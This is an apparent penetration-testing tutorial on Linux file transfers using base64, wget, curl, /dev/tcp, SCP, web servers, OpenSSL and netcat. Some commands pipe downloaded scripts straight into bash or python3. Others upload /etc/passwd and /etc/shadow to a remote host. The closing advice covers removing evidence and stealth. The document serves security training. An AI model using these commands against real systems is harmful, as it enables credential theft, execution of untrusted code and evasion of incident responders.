# Linux File Transfers

## Linux File Transfers

Linux systems provide numerous native tools for transferring files across networks. Understanding these methods is essential for security professionals conducting assessments or responding to incidents.

### Base64 Encoding/Decoding

Base64 encoding allows transferring files without requiring traditional file transfer protocols, which is particularly useful for text-based terminal sessions.

#### Encoding and Transferring Files

```bash
# Check original file hash
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa

# Encode file to base64
cat id_rsa | base64 -w 0

# Result: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhr...
```

#### Decoding on Target System

```bash
# Decode base64 string to file
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnph...' | base64 -d > id_rsa

# Verify file integrity
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```

### Web Downloads

Most Linux distributions include utilities that can interact with web servers for file transfers.

#### Using wget

```bash
# Basic file download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Download with custom user agent
wget --user-agent="Mozilla/5.0" -O /tmp/file.txt https://target-site.com/file.txt

# Resume interrupted download
wget -c https://example.com/largefile.iso
```

#### Using curl

```bash
# Basic file download
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Silent download (no progress meter)
curl -s -o /tmp/file.txt https://example.com/file.txt

# Follow redirects
curl -L -o /tmp/file.txt https://example.com/file.txt
```

### Fileless Attacks

Linux pipes allow executing downloaded content directly without saving to disk.

#### Direct Execution with curl

```bash
# Download and execute script
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Download and pipe to interpreter
curl https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Direct Execution with wget

```bash
# Download and execute
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Bash /dev/tcp Downloads

When common utilities are unavailable, Bash's built-in networking capabilities can be used.

```bash
# Connect to remote server
exec 3<>/dev/tcp/10.10.10.32/80

# Send HTTP GET request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Read and process response
cat <&3 | tail -n +10 > LinEnum.sh 
# (tail -n +10 skips HTTP headers)
```

### SSH/SCP Transfers

Secure Copy Protocol (SCP) provides encrypted file transfers using SSH.

#### Setting Up SSH Server

```bash
# Enable SSH server
sudo systemctl enable ssh

# Start SSH server
sudo systemctl start ssh

# Verify SSH is running
netstat -lnpt | grep ssh
```

#### Downloading with SCP

```bash
# Download file from remote host
scp plaintext@192.168.49.128:/root/myroot.txt .

# Download directory recursively
scp -r plaintext@192.168.49.128:/path/to/directory .
```

#### Uploading with SCP

```bash
# Upload file to remote host
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

# Upload directory recursively
scp -r /local/directory htb-student@10.129.86.90:/home/htb-student/
```

### Python Web Server

Python's built-in HTTP server modules provide a quick way to serve files.

#### Starting a Web Server

```bash
# Python 3
python3 -m http.server 8000

# Python 2.7
python2.7 -m SimpleHTTPServer 8000

# Specify interface and port
python3 -m http.server --bind 192.168.1.10 8080
```

#### Alternative Web Servers

```bash
# PHP web server
php -S 0.0.0.0:8000

# Ruby web server
ruby -run -ehttpd . -p8000
```

### Web Server with Upload Capability

Standard Python HTTP servers don't support file uploads. The `uploadserver` module adds this functionality.

#### Setting Up Upload Server

```bash
# Install uploadserver
sudo pip3 install uploadserver

# Basic HTTP upload server
python3 -m uploadserver

# HTTPS upload server with certificate
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### Uploading Files to Server

```bash
# Upload single file using curl
curl -X POST http://192.168.49.128:8000/upload -F 'files=@/etc/passwd'

# Upload multiple files
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

### OpenSSL Transfers

OpenSSL can be used to create encrypted connections for file transfers.

#### Server Side

```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Start OpenSSL server with file
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

#### Client Side

```bash
# Connect and download file
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Netcat Transfers

Netcat (nc) provides a simple way to transfer files between systems.

#### Receiving Side

```bash
# Listen for incoming data and save to file
nc -lvnp 8000 > received_file.txt
```

#### Sending Side

```bash
# Send file data
cat file.txt | nc 192.168.49.128 8000
```

### Troubleshooting Network Restrictions

#### Identifying Available Outbound Protocols

```bash
# Test HTTP outbound
curl -s -m 3 http://example.com > /dev/null && echo "HTTP allowed" || echo "HTTP blocked"

# Test HTTPS outbound
curl -s -m 3 https://example.com > /dev/null && echo "HTTPS allowed" || echo "HTTPS blocked"

# Test DNS outbound
dig +short example.com @8.8.8.8 > /dev/null && echo "DNS allowed" || echo "DNS blocked"
```

#### Common Errors and Solutions

**Unable to Connect**

```
wget: unable to resolve host address
curl: (6) Could not resolve host
```

Solution: Check DNS settings or use IP address instead of hostname.

**Connection Timeout**

```
wget: connection timed out
curl: (28) Connection timed out
```

Solution: Verify network connectivity or try alternate port/protocol.

**Permission Denied**

```
curl: (13) Permission denied
```

Solution: Check file permissions or run with appropriate privileges.

### Best Practices

1. **Use encrypted transfers** (HTTPS, SCP) when possible
2. **Verify file integrity** using checksums (md5sum, sha256sum)
3. **Clean up after transfers** to avoid leaving evidence
4. **Prefer native tools** that are likely to be available
5. **Consider fileless transfers** for stealth operations
6. **Create temporary users** for SCP/SSH transfers rather than using existing credentials
